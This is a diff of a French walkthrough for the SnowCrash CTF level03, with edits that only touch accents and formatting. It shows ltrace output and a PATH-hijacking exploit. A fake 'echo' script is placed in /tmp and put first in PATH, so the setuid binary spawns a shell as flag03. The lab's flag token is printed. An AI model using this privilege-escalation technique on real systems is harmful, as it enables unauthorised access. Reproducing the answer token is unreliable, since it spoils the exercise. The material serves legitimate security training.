@@ -1,8 +1,8 @@
-On trouve dans le dossier home un binaire ./level03 qui quand on le lance nous affiche un message:
+On trouve dans le dossier **home** un binaire **level03** qui, lorsqu'on le lance, nous affiche un message:
 <pre><code>> ./level03
 Exploit me</code></pre>
 
-On cherche a savoir ce que le binaire fait, pour cela on utilise ltrace:
+On cherche à savoir ce que le binaire fait, pour cela on utilise **ltrace**:
 <pre><code>> ltrace ./level03
 __libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580
 getegid()											= 2003
@@ -13,9 +13,9 @@ system("/usr/bin/env echo Exploit me"Exploit me
 --- SIGCHLD (Child exited) ---
 <... system resumed> )
 </code></pre>
-On observe que le binaire fait un appel system pour faire un **echo**
+On observe que le binaire fait un appel **system** pour faire un **echo**
 
-Du coup nous essayons de changer cet appel pour avoir acces a un shell avec les permissions de l'owner:
+Du coup nous essayons de changer cet appel pour avoir accès à un shell avec les permissions de l'owner:
 
 <pre><code>> echo "/bin/bash" > /tmp/echo
 > chmod 777 /tmp/echo && export PATH=/tmp:$PATH
@@ -27,13 +27,14 @@ On relance notre binaire:
 <pre><code>> ./level03</code></pre>
 
 Notre user passe de <code>level03@SnowCrash</code> à <code>flag03@SnowCrash</code>
+
 Donc notre user a bien changé.
 
 <pre>
 <code>> getflag</code>
 Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
 </pre>
-> La commande **getflag** est la seule commande que nous pouvons faire, bien evidemment, sinon il nous serait possible de faire ce que l'on veut sur l'ISO.
+> La commande **getflag** est la seule commande que nous pouvons faire, bien évidemment, sinon il nous serait possible de faire ce que l'on veut sur l'ISO.
 
 
 ## Alternative
